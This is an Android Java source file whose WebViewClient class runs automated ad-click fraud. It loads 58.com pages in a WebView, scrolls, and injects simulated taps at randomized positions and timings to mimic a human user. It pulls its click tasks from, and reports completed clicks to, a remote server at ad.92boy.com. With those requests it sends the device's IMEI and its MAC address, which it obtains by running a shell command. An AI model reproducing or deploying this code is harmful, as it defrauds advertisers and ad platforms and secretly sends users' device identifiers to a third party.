package com.example.adsrun;

import android.app.Activity;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class MWebClient extends WebViewClient
{

	public List<AdsLinkNode> urls;

	public String date = "";

	public interface MockTaskListener
	{
		void onFinish();

		void onError();
	}

	private int currentIndex = 0;

	private MockTaskListener mListener = new MockTaskListener()
	{

		@Override
		public void onFinish()
		{
			currentIndex++;
			if (currentIndex >= urls.size())
			{
				try
				{
					mWeb.setVisibility(View.GONE);
					mWeb.removeAllViews();
					mWeb.destroy();
					Log.d(TAG, "第" + urls.size() + "个跑完");
					takeReport(urls.get(urls.size() - 1).getId(), urls.get(urls.size() - 1).getNum(), urls.get(urls.size() - 1).getNum());
					Log.d(TAG, "ad is over");

					mWeb.getContext().getSharedPreferences("adrunToday", Activity.MODE_PRIVATE).edit().clear().commit();
					mWeb.getContext().getSharedPreferences("adrunToday", Activity.MODE_PRIVATE).edit().putInt(date, urls.size()).commit();
				}
				catch (Exception e)
				{

				}
				return;
			}

			Log.d(TAG, "第" + currentIndex + "个跑完");
			takeReport(urls.get(currentIndex - 1).getId(), urls.get(currentIndex - 1).getNum(), urls.get(currentIndex - 1).getNum());
			mWeb.getContext().getSharedPreferences("adrunToday", Activity.MODE_PRIVATE).edit().putInt(date, currentIndex).commit();

			MAX_ENTER_DETAIL_COUNT = urls.get(currentIndex).getNum();
			mWeb.loadUrl(urls.get(currentIndex).getUrl());
			Log.d(TAG, (currentIndex + 1) + "th start");
		}

		@Override
		public void onError()
		{

		}
	};

	private static final String TAG = "AdList-->";

	// 小链接跑的次数
	private static int MAX_ENTER_DETAIL_COUNT = 2;

	private static final int DEFAULT_LOAD_SIZE = 18;

	private static final int NAV_H = 75;
	private static final int BANNER_H = 103;
	private static final int ITEM_H = 99;
	private static final int FOOTER_H = 49;
	private static final int R_ITEM_H = 39;
	private static final int R_COUNT = 6;
	private WebView mWeb;

	private int enterDetailCount = 0;

	public MWebClient(WebView mWeb)
	{
		this.mWeb = mWeb;
		this.mWeb.getSettings().setJavaScriptEnabled(true);
		urls = new ArrayList<AdsLinkNode>();
		getLinks();
	}

	public void startRun()
	{

		int hasRunCount = mWeb.getContext().getSharedPreferences("adrunToday", Activity.MODE_PRIVATE).getInt(date, 0);

		if (hasRunCount == 0)
		{
			currentIndex = 0;
		}
		else
		{
			currentIndex = hasRunCount + 1;
		}

		if (currentIndex < urls.size())
		{
			Log.d(TAG, "ad is start");
			MAX_ENTER_DETAIL_COUNT = urls.get(currentIndex).getNum();
			mWeb.loadUrl(urls.get(currentIndex).getUrl());
			Log.d(TAG, (currentIndex + 1) + "th start");
		}
	}

	public void setListener(MockTaskListener mListener)
	{
		this.mListener = mListener;
	}

	Handler mHandler = new Handler(Looper.getMainLooper())
	{
		public void handleMessage(android.os.Message msg)
		{
			if (msg.what == -1)
			{
				startRun();
			}
		};
	};
	Runnable mListaPageWorker = new Runnable()
	{
		@Override
		public void run()
		{
			if (enterDetailCount >= MAX_ENTER_DETAIL_COUNT)
			{
				cleanUpWeb();
				if (mListener != null) mListener.onFinish();
				return;
			}

			int contentH = mWeb.getContentHeight();
			int height = mWeb.getHeight();

			int clickH = random(NAV_H + BANNER_H + 50, height);
			int scrollH = random(0, contentH - height);
			mWeb.scrollBy(0, scrollH);
			Log.d(TAG, "ad is running");
			mockClick(mWeb, mWeb.getWidth() >> 1, clickH);
			enterDetailCount++;

			mWeb.postDelayed(new Runnable()
			{
				public void run()
				{
					mWeb.scrollTo(0, random(300, 3000));
				}
			}, random(3000, 8000));
		}
	};

	private void cleanUpWeb()
	{
		mHandler.removeCallbacks(mGoListPageWorker);
		mHandler.removeCallbacks(mListaPageWorker);
		mHandler.removeCallbacks(mDetailPageWorker);
		enterDetailCount = 0;
	}

	Runnable mDetailPageWorker = new Runnable()
	{
		@Override
		public void run()
		{
			int contentH = mWeb.getContentHeight();
			int height = mWeb.getHeight();
			mWeb.scrollBy(0, contentH);
			mockClick(mWeb, mWeb.getWidth() >> 1, ((height - FOOTER_H) + (height - FOOTER_H - R_COUNT * R_ITEM_H)) >> 1);
		}
	};

	Runnable mGoListPageWorker = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "ad is goBack");
			mWeb.goBack();
		}
	};

	public void mockClick(View view, float x, float y)
	{
		long downTime = SystemClock.uptimeMillis();
		MotionEvent downEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, x, y, 0);
		downTime += 1000;

		MotionEvent upEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_UP, x, y, 0);

		view.onTouchEvent(downEvent);
		view.onTouchEvent(upEvent);
		downEvent.recycle();
		upEvent.recycle();
	}

	private boolean isListPage(String url) {
        return !TextUtils.isEmpty(url) && url.startsWith("https://luna.58.com/m/activity");
    }

    private boolean isDetailPage(String url) {
        return !TextUtils.isEmpty(url) && url.startsWith("https://m.58.com") && (url.contains("yewu")
                || url.contains("banjia")
                || url.contains("zpshengchankaifa")
                || url.contains("ershoufang")
                || url.contains("shouji")
        );
    }

    private boolean isBannerPage(String url) {
        return !TextUtils.isEmpty(url) && url.startsWith("https://luna.58.com/list");
    }

    private boolean isJumpPage(String url) {
        return !TextUtils.isEmpty(url) && url.startsWith("https://jump.zhineng.58.com/jump");
    }

    private boolean isReportPage(String url) {
        return !TextUtils.isEmpty(url) && url.startsWith("https://m.58.com") && url.indexOf("jubao") > 0;
    }

	@SuppressWarnings("deprecation")
	@Override
	public boolean shouldOverrideUrlLoading(WebView view, String url)
	{
		view.loadUrl(url);
		return true;
	}

	@Override
	public void onPageFinished(WebView view, String url)
	{
		if (isListPage(url)) handleListView(view, url);
		else if (isDetailPage(url)) handleDetailView(view, url);
		else if (!isJumpPage(url))
		{
			mHandler.removeCallbacks(mGoListPageWorker);
			// 小链停留时间
			mHandler.postDelayed(mGoListPageWorker, random(4000, 12000));
		}
	}

	private void handleDetailView(WebView view, String url)
	{
		mHandler.removeCallbacks(mDetailPageWorker);
		mHandler.removeCallbacks(mGoListPageWorker);

		// 小链接循环时间
		int delayTime = 5 * 1000;

		mHandler.postDelayed(mDetailPageWorker, delayTime);
		mHandler.postDelayed(mGoListPageWorker, delayTime + 2000);
	}

	private void handleListView(WebView view, String url)
	{
		mHandler.removeCallbacks(mListaPageWorker);
		// 大链停留时间
		mHandler.postDelayed(mListaPageWorker, random(3000, 10000));
	}

	private int random(int start, int end)
	{
		return (int) (start + Math.random() * (end - start));
	}

	private String change(String ss)
	{
		if (ss == null || ss.length() == 0)
		{
			ss = "";
		}
		return ss;
	}

	// 获取mac地址
	private String getMacAddress()
	{
		String result = "";
		String Mac = "";
		result = callCmd("busybox ifconfig", "HWaddr");
		if (result == null) { return ""; }
		if (result.length() > 0 && result.contains("HWaddr"))
		{
			Mac = result.substring(result.indexOf("HWaddr") + 6, result.length() - 1);
			if (Mac.length() > 1)
			{
				result = Mac.toLowerCase();
			}
		}
		return result.trim();
	}

	private String callCmd(String cmd, String filter)
	{
		String result = "";
		String line = "";
		try
		{
			Process proc = Runtime.getRuntime().exec(cmd);
			InputStreamReader is = new InputStreamReader(proc.getInputStream());
			BufferedReader br = new BufferedReader(is);
			while ((line = br.readLine()) != null && line.contains(filter) == false)
			{
			}
			result = line;
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		return result;
	}

	public void getLinks()
	{

		SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd");
		Date curDate = new Date(System.currentTimeMillis());
		date = formatter.format(curDate);

		String linkJson = mWeb.getContext().getSharedPreferences("adrunLink", Activity.MODE_PRIVATE).getString(date, "");

		if (linkJson != null && linkJson.length() > 0)
		{
			try
			{
				JSONArray j1 = new JSONArray(linkJson);
				for (int i = 0; i < j1.length(); i++)
				{
					JSONObject j2 = j1.getJSONObject(i);
					String url = j2.getString("url");
					int num = j2.getInt("num");
					AdsLinkNode node = new AdsLinkNode();
					node.url = url;
					node.num = num;
					urls.add(node);
				}
				mHandler.sendEmptyMessage(-1);
			}
			catch (JSONException e)
			{
				e.printStackTrace();
			}
			return;
		}

		new Thread(new Runnable()
		{

			@Override
			public void run()
			{
				String reportUrl = "http://ad.92boy.com:8017/api.php?do=ckItem";
				HttpPost httpPost = new HttpPost(reportUrl);
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				HttpResponse httpResponse = null;
				try
				{
					TelephonyManager tm = (TelephonyManager) mWeb.getContext().getSystemService(Context.TELEPHONY_SERVICE);
					String app_pkg = change(mWeb.getContext().getPackageName());
					params.add(new BasicNameValuePair("app_pkg", app_pkg));
					params.add(new BasicNameValuePair("app_ver", change(mWeb.getContext().getPackageManager().getPackageInfo(app_pkg, 0).versionName)));
					params.add(new BasicNameValuePair("imei", change(tm.getDeviceId())));
					params.add(new BasicNameValuePair("mac", change(getMacAddress())));

					httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
					httpResponse = new DefaultHttpClient().execute(httpPost);
					if (httpResponse.getStatusLine().getStatusCode() == 200)
					{
						String result = EntityUtils.toString(httpResponse.getEntity());
						Log.d("AdList-->", result.toString());
						JSONArray j1 = new JSONArray(result);
						for (int i = 0; i < j1.length(); i++)
						{
							JSONObject j2 = j1.getJSONObject(i);
							String url = j2.getString("url");
							int num = j2.getInt("num");
							AdsLinkNode node = new AdsLinkNode();
							node.url = "https://jumpluna.58.com/i/Loz5GR82J9tMeMj";
							node.num = num;
							urls.add(node);
						}
						mWeb.getContext().getSharedPreferences("adrunLink", Activity.MODE_PRIVATE).edit().clear().commit();
						mWeb.getContext().getSharedPreferences("adrunLink", Activity.MODE_PRIVATE).edit().putString(date, result).commit();
						mHandler.sendEmptyMessage(-1);
					}
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		}).start();
	}

	/*
	 * 统计上报
	 */
	public void takeReport(final int urlid, final int num, final int succ)
	{

		new Thread(new Runnable()
		{

			@Override
			public void run()
			{
				String reportUrl = "http://ad.92boy.com:8017/api.php?do=ckResult";
				HttpPost httpPost = new HttpPost(reportUrl);
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				HttpResponse httpResponse = null;
				try
				{
					TelephonyManager tm = (TelephonyManager) mWeb.getContext().getSystemService(Context.TELEPHONY_SERVICE);
					String app_pkg = change(mWeb.getContext().getPackageName());
					params.add(new BasicNameValuePair("app_pkg", app_pkg));
					params.add(new BasicNameValuePair("app_ver", change(mWeb.getContext().getPackageManager().getPackageInfo(app_pkg, 0).versionName)));
					params.add(new BasicNameValuePair("imei", change(tm.getDeviceId())));
					params.add(new BasicNameValuePair("mac", change(getMacAddress())));
					params.add(new BasicNameValuePair("urlid", urlid + ""));
					params.add(new BasicNameValuePair("num", num + ""));
					params.add(new BasicNameValuePair("succ", succ + ""));

					httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
					httpResponse = new DefaultHttpClient().execute(httpPost);
					if (httpResponse.getStatusLine().getStatusCode() == 200)
					{
						String result = EntityUtils.toString(httpResponse.getEntity());
						Log.d("AdList-->", result.toString());
					}
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		}).start();

	}
}
